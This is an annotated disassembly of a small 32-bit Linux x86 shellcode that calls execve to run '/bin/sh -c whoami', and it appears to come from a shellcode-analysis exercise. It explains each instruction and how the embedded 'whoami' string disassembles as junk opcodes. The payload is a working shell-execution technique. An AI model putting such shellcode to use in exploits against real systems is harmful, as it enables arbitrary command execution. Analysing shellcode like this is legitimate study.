push   0xb                         ; push 0xb to the top of the stack
pop    eax                        ; put 0xb in eax which is 11 in int ... which is the syscall sys_execve
cdq                               ; Convert Doubleword to Quadword
push   edx                        ; push 0x0 to the top of the stack
pushw  0x632d                     ; push -c to the stack and to ESP
mov    edi,esp                    ; mov value from esp to edi
push   0x68732f                   ; push /sh to the top of the stack
push   0x6e69622f                 ; push /bin to the top of the stack
mov    ebx,esp                    ; mov /bin/sh in ebx
push   edx                        ; push 0x0 to top of the stack
call   0x2045 <code+37>

; will push the address 0xffffce26 that contain the string whoami in the EDI register
ja     0x20a7
outs   dx,DWORD PTR ds:[esi]
popa
ins    DWORD PTR es:[edi],dx
imul   eax,DWORD PTR [eax],0xe1895357

; assembly code from call instruction 0x2045
push   edi                        ; push -c to the top of the stack
push   ebx                        ; push /bin/sh in the stack
mov    ecx,esp                    ; push /bin/sh in ecx

int    0x80                       ; call execve("/bin/sh", ["/bin/sh", "-c", "whoami"], 0)
add    BYTE PTR [eax],al
